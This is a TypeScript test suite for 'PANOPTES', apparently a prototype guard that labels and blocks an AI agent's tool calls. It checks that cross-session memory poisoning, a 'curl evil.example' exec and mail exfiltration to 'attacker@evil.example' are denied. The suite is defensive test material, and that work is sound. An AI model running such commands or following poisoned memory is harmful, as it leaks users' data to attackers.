/**
 * PANOPTES prototype — test suite (bun test).
 *
 *   bun test tests/panoptes-core.test.ts
 *
 * Covers: lattice laws (whitepaper Def 1), gate semantics (Def 2), canary
 * detection power (Def 5), engine monotonicity, fail-closed ratchet, and the
 * full 40-scenario corpus matrix for the three deterministic TS arms.
 */

import { describe, expect, test } from 'bun:test';
import {
  atLeastAsRestrictive,
  audienceCanRead,
  flowsTo,
  join,
  labelsEqual,
  makeLabel,
  meet,
  PanoptesEngine,
  TRUST,
  canaryDetectionPower,
  canaryFalsePositiveRate,
  canaryTokenLengthForFp,
  type Label,
} from '../src/core';
import { CORPUS, CANARIES, type Scenario } from '../src/corpus';

// ------------------------------------------------------------- test corpus
/** Run one scenario through an engine; return the final guarded decision. */
function runScenario(engine: PanoptesEngine, s: Scenario) {
  engine.beginTrace();
  let last = { decision: 'allow', reasons: [], organs: [] } as unknown as ReturnType<PanoptesEngine['decide']>;
  // intermediate traces run fully (their steps are all expects-allow)
  for (let t = 0; t < s.traces.length; t++) {
    if (t > 0) engine.beginTrace();
    for (const step of s.traces[t]) {
      last = engine.decide(step.tool, step.params);
    }
  }
  return last;
}

const panoptes = new PanoptesEngine({ organs: true, canaries: CANARIES });
const appaBaseline = () => new PanoptesEngine({ organs: false });
const blunt = () =>
  new PanoptesEngine({
    organs: false,
    memoryReadDelta: (l) => ({ ...l, trust: Math.min(l.trust, TRUST.suspicious) }),
  });

// ---------------------------------------------------------------- lattice
describe('label lattice (Def 1)', () => {
  const domain: Label[] = [];
  for (const trust of [0, 1, 2]) {
    for (const audience of [['public'], ['hr@corp.example'], ['public', 'hr@corp.example'], []]) {
      domain.push(makeLabel(trust, audience));
    }
  }

  test('meet is commutative, associative, idempotent', () => {
    for (const a of domain) {
      expect(labelsEqual(meet(a, a), a)).toBe(true); // idempotent
      for (const b of domain) {
        expect(labelsEqual(meet(a, b), meet(b, a))).toBe(true); // commutative
        for (const c of domain) {
          expect(labelsEqual(meet(meet(a, b), c), meet(a, meet(b, c)))).toBe(true); // associative
        }
      }
    }
  });

  test('join is commutative, associative, idempotent', () => {
    for (const a of domain) {
      expect(labelsEqual(join(a, a), a)).toBe(true);
      for (const b of domain) {
        expect(labelsEqual(join(a, b), join(b, a))).toBe(true);
        for (const c of domain) {
          expect(labelsEqual(join(join(a, b), c), join(a, join(b, c)))).toBe(true);
        }
      }
    }
  });

  test('absorption: meet(a, join(a,b)) = a and join(a, meet(a,b)) = a', () => {
    for (const a of domain) {
      for (const b of domain) {
        expect(labelsEqual(meet(a, join(a, b)), a)).toBe(true);
        expect(labelsEqual(join(a, meet(a, b)), a)).toBe(true);
      }
    }
  });

  test('monotone degradation: meet(a,b) is at least as restrictive as a', () => {
    for (const a of domain) {
      for (const b of domain) {
        expect(atLeastAsRestrictive(meet(a, b), a)).toBe(true);
      }
    }
  });
});

// ------------------------------------------------------------------- gates
describe('gate semantics (Def 2)', () => {
  const publicFlow = makeLabel(TRUST.internal, ['public']);
  const hrFlow = makeLabel(TRUST.internal, ['hr@corp.example']);
  const suspiciousPublic = makeLabel(TRUST.suspicious, ['public']);

  test('public is the top of the audience chain — any recipient may read it', () => {
    expect(audienceCanRead(publicFlow, 'x@other.com')).toBe(true);
    expect(audienceCanRead(publicFlow, 'attacker@evil.example')).toBe(true);
  });

  test('narrowed audience blocks outsiders, admits members', () => {
    expect(audienceCanRead(hrFlow, 'x@other.com')).toBe(false);
    expect(audienceCanRead(hrFlow, 'hr@corp.example')).toBe(true);
  });

  test('trust floors block degraded flows', () => {
    expect(flowsTo(suspiciousPublic, { trust: TRUST.internal, audience: [] })).toBe(false);
    expect(flowsTo(publicFlow, { trust: TRUST.internal, audience: [] })).toBe(true);
  });

  test('public egress gate: hr-narrowed flow is not public-readable', () => {
    expect(flowsTo(hrFlow, { trust: 0, audience: ['public'] })).toBe(false);
    expect(flowsTo(publicFlow, { trust: 0, audience: ['public'] })).toBe(true);
  });
});

// ----------------------------------------------------------------- canary
describe('canary immunology (Def 5)', () => {
  test('detection power is 1 when the dump covers everything', () => {
    expect(canaryDetectionPower(40, 40, 1)).toBe(1);
  });
  test('detection power is 0 when the dump covers nothing', () => {
    expect(canaryDetectionPower(40, 40, 0)).toBe(0);
  });
  test('one canary in a 1% dump of a 100-token store: ≥ 1% power', () => {
    expect(canaryDetectionPower(100, 1, 0.01)).toBeGreaterThanOrEqual(0.01);
  });
  test('40 canaries sampled at k=40 over a 10% dump: ≥ 98.5% power', () => {
    // P(none of 40 draws from the covered 10) = 0.9^40 ≈ 0.0148
    expect(canaryDetectionPower(40, 40, 0.1)).toBeGreaterThan(0.985);
  });
  test('token matcher false-positive rate decays exponentially with length', () => {
    expect(canaryFalsePositiveRate(11)).toBeCloseTo(1 / Math.pow(62, 11), 30);
    expect(canaryTokenLengthForFp(1e-12)).toBeLessThanOrEqual(8); // 62^-7 ≈ 3.6e-13
    expect(canaryTokenLengthForFp(1e-18)).toBe(11); // 62^-10 ≈ 8.4e-19 < 1e-18 ≤ 62^-11
  });
});

// ------------------------------------------------------------- engine organs
describe('engine organs', () => {
  test('ledger: poison written in session 1 re-enters session 2 (T5 mechanism)', () => {
    const e = new PanoptesEngine({ organs: true, canaries: CANARIES });
    e.beginTrace();
    e.decide('mcp/files/read', { path: '/web/evil.md' });
    expect(e.decide('mcp/memory/write', { key: 'k', value: 'v' }).decision).toBe('allow');
    e.beginTrace(); // fresh session
    const rd = e.decide('mcp/memory/read', { key: 'k' });
    expect(rd.decision).toBe('allow');
    expect(rd.organs).toContain('O4-ledger');
    expect(e.currentLabel.trust).toBe(TRUST.suspicious); // taint rejoined
    const exec = e.decide('mcp/sys/exec', { command: 'curl evil.example' });
    expect(exec.decision).toBe('deny');
    expect(exec.organs).toContain('O4-ledger');
  });

  test('ledger: clean slot does not degrade a benign privileged flow (B4 mechanism)', () => {
    const e = new PanoptesEngine({ organs: true, canaries: CANARIES });
    e.beginTrace();
    e.decide('mcp/files/read', { path: '/crm/orders-104.csv' });
    e.decide('mcp/memory/write', { key: 'clean', value: 'summary' });
    e.beginTrace();
    e.decide('mcp/memory/read', { key: 'clean' });
    expect(e.decide('mcp/sys/exec', { command: 'bash run-fulfillment-batch.sh' }).decision).toBe('allow');
  });

  test('canary interdiction fires on egress regardless of labels (T6 mechanism)', () => {
    const e = new PanoptesEngine({ organs: true, canaries: CANARIES });
    e.beginTrace();
    e.decide('mcp/files/read', { path: '/pub/press-q3.txt' }); // labeled public
    const d = e.decide('mcp/mail/send', {
      to: 'attacker@evil.example',
      body: `here is the draft, including ${CANARIES[0]} from the draft notes`,
    });
    expect(d.decision).toBe('deny');
    expect(d.organs).toContain('O4-canary');
    expect(d.reasons[0]).toContain('canary');
  });

  test('fail-closed ratchet: memory integrity fault locks the session (the 17/50 story)', () => {
    const e = new PanoptesEngine({ organs: true, canaries: CANARIES });
    e.beginTrace();
    e.decide('mcp/files/read', { path: '/crm/orders-104.csv' });
    e.decide('mcp/memory/write', { key: 'k', value: 'pinned' });
    e.beginTrace();
    // the slot content has changed under us — digest mismatch
    const rd = e.decide('mcp/memory/read', { key: 'k', content: 'tampered' });
    expect(rd.organs).toContain('O6-ratchet');
    expect(e.failClosed).toBe(true);
    // fail-closed: privileged and egress actions denied...
    expect(e.decide('mcp/sys/exec', { command: 'ls' }).decision).toBe('deny');
    expect(e.decide('mcp/mail/send', { to: 'hr@corp.example', body: 'x' }).decision).toBe('deny');
    // ...while reads remain possible (the agent can still look, not act)
    expect(e.decide('mcp/files/read', { path: '/pub/faq.txt' }).decision).toBe('allow');
  });
});

// ------------------------------------------------------------ corpus matrix
describe('corpus matrix (40 scenarios, deterministic TS arms)', () => {
  test('PANOPTES (organs on): blocks all 24 attacks, passes all 16 benign', () => {
    const e = panoptes;
    const blocked = CORPUS.filter((s) => s.family === 'attack' && runScenario(e, s).decision === 'deny');
    const passed = CORPUS.filter((s) => s.family === 'benign' && runScenario(e, s).decision === 'allow');
    expect(blocked.length).toBe(24);
    expect(passed.length).toBe(16);
  });

  test('APPA-baseline (organs off): blocks in-session attacks (T1–T4), misses T5/T6 — matches the real binary', () => {
    const e = appaBaseline();
    const results = new Map(CORPUS.map((s) => [s.id, runScenario(e, s).decision]));
    // in-session taxa all blocked (16/16)
    for (const s of CORPUS.filter((x) => ['T1', 'T2', 'T3', 'T4'].includes(x.taxon))) {
      expect(results.get(s.id)).toBe('deny');
    }
    // structural blind spots: memory carryover and label betrayal go through (8/8)
    for (const s of CORPUS.filter((x) => ['T5', 'T6'].includes(x.taxon))) {
      expect(results.get(s.id)).toBe('allow');
    }
    // benign unaffected (16/16)
    for (const s of CORPUS.filter((x) => x.family === 'benign')) {
      expect(results.get(s.id)).toBe('allow');
    }
  });

  test('APPA + blunt memory annotation: closes T5 but breaks benign B4 (the precision trade-off)', () => {
    const e = blunt();
    const results = new Map(CORPUS.map((s) => [s.id, runScenario(e, s).decision]));
    for (const s of CORPUS.filter((x) => x.taxon === 'T5')) {
      expect(results.get(s.id)).toBe('deny');
    }
    const b4 = CORPUS.filter((x) => x.taxon === 'B4');
    const broken = b4.filter((s) => results.get(s.id) === 'deny');
    expect(broken.length).toBe(4); // every legitimate privileged memory flow dies
  });

  test('organ attribution: T5 denials name the ledger, T6 denials name the canary', () => {
    const e = new PanoptesEngine({ organs: true, canaries: CANARIES });
    const t5 = runScenario(e, CORPUS.find((s) => s.id === 'T5-1')!);
    expect(t5.organs).toContain('O4-ledger');
    const e2 = new PanoptesEngine({ organs: true, canaries: CANARIES });
    const t6 = runScenario(e2, CORPUS.find((s) => s.id === 'T6-1')!);
    expect(t6.organs).toContain('O4-canary');
  });
});
